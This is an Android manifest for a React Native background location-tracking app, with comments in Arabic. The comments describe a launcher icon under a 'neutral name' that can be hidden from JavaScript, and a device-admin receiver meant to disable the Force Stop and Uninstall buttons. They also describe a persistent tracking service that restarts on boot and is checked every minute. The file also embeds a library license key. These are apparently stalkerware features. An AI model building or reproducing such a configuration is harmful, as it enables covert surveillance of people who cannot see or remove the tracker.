<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <!-- ===== BASIC PERMISSIONS ===== -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.VIBRATE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />

    <!-- ===== LOCATION PERMISSIONS ===== -->
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />

    <!-- ===== ANDROID 14/15 FOREGROUND SERVICE PERMISSIONS ===== -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
    
    <!-- ===== ANDROID 14+ EXACT ALARM PERMISSION ===== -->
    <uses-permission android:minSdkVersion="34" android:name="android.permission.USE_EXACT_ALARM" />
    
    <!-- ===== ANDROID 13+ NOTIFICATION PERMISSION ===== -->
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    
    <!-- ===== BATTERY OPTIMIZATION PERMISSION ===== -->
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />

    <application
        android:name=".MainApplication"
        android:allowBackup="false"
        android:theme="@style/AppTheme"
        android:icon="@mipmap/ic_launcher"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:label="@string/app_name"
        android:usesCleartextTraffic="${usesCleartextTraffic}"
        android:supportsRtl="true">

        <!-- ===== TRANSISTOR BACKGROUND GEOLOCATION LICENSE ===== -->
        <meta-data
            android:name="com.transistorsoft.locationmanager.license"
            android:value="6c61f89b598dabe110900e7926bccf8a3f916ebca075a4ee03350712f6d30e83" />
            
        <!-- ===== GOOGLE PLAY SERVICES VERSION ===== -->
        <meta-data
            android:name="com.google.android.gms.version"
            android:value="@integer/google_play_services_version" />
            
        <!-- ===== ACTIVITY RECOGNITION API SUPPORT ===== -->
        <meta-data
            android:name="com.google.android.gms.location.ActivityRecognitionApi"
            android:value="true" />

        <!-- ===== MAIN ACTIVITY ===== -->
        <!-- ملاحظة: الـ MAIN/LAUNCHER intent-filter انتقل لـ MainActivityAlias عشان نقدر نخفي الأيقونة -->
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTask"
            android:theme="@style/AppTheme"
            android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode"
            android:windowSoftInputMode="adjustResize"
            android:screenOrientation="portrait" />

        <!-- ===== ACTIVITY ALIAS - الأيقونة الظاهرة في الـ Launcher ===== -->
        <!-- اسم محايد + يمكن إخفاؤه/إظهاره من JavaScript -->
        <activity-alias
            android:name=".MainActivityAlias"
            android:enabled="true"
            android:exported="true"
            android:icon="@mipmap/ic_launcher"
            android:roundIcon="@mipmap/ic_launcher_round"
            android:label="@string/alias_app_name"
            android:targetActivity=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <!-- ===== DEVICE ADMIN RECEIVER ===== -->
        <!-- يعطّل أزرار Force Stop + Uninstall في إعدادات التطبيق -->
        <receiver
            android:name=".WhiteHorseAdminReceiver"
            android:label="@string/device_admin_label"
            android:description="@string/device_admin_description"
            android:permission="android.permission.BIND_DEVICE_ADMIN"
            android:exported="true">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin_policies" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
            </intent-filter>
        </receiver>

        <!-- ===== TRANSISTOR BACKGROUND GEOLOCATION SERVICES ===== -->
        <!-- NOTE: Only adding foregroundServiceType to existing services -->
        <!-- The services themselves are already defined in the Transistor library -->
        
        <!-- TrackingService - Primary location tracking service -->
        <service 
            android:name="com.transistorsoft.locationmanager.service.TrackingService"
            android:foregroundServiceType="location"
            android:exported="false" />

        <!-- ActivityRecognitionService - Motion detection service -->
        <service 
            android:name="com.transistorsoft.locationmanager.service.ActivityRecognitionService"
            android:foregroundServiceType="location"
            android:exported="false"
            tools:replace="android:foregroundServiceType" />

        <!-- LocationRequestService - Location request handling service -->
        <service 
            android:name="com.transistorsoft.locationmanager.service.LocationRequestService"
            android:foregroundServiceType="location"
            android:exported="false" />

        <!-- HeartbeatService - Periodic heartbeat service -->
        <service 
            android:name="com.transistorsoft.locationmanager.service.HeartbeatService"
            android:foregroundServiceType="location"
            android:exported="false" />

        <!-- ===== REACT NATIVE HEADLESS JS SERVICE ===== -->
        <service 
            android:name="com.transistorsoft.rnbackgroundgeolocation.HeadlessTask"
            android:foregroundServiceType="location"
            android:exported="false" />

        <!-- ScheduleService - Override to fix Android 16 compatibility -->
        <service 
            android:name="com.transistorsoft.locationmanager.scheduler.ScheduleService"
            android:foregroundServiceType="shortService"
            android:exported="false"
            tools:replace="android:foregroundServiceType" />

        <!-- NOTE: Broadcast receivers are already defined in Transistor library -->
        <!-- No need to redefine them here to avoid manifest merger conflicts -->
        
        <!-- ===== FORCE TRACKING SERVICE ===== -->
        <!-- خدمة قوية لضمان استمرار التتبع -->
        <service 
            android:name=".ForceTrackingService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="location"
            android:stopWithTask="false" />

        <!-- ===== BOOT RECEIVER ===== -->
        <!-- يبدأ التتبع تلقائياً بعد إعادة تشغيل الجهاز -->
        <receiver 
            android:name=".AbsoluteBootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter android:priority="1000">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>

        <!-- ===== SERVICE CHECK RECEIVER ===== -->
        <!-- يفحص الخدمة كل دقيقة -->
        <receiver android:name=".ForceTrackingService$ServiceCheckReceiver" />

    </application>
</manifest>

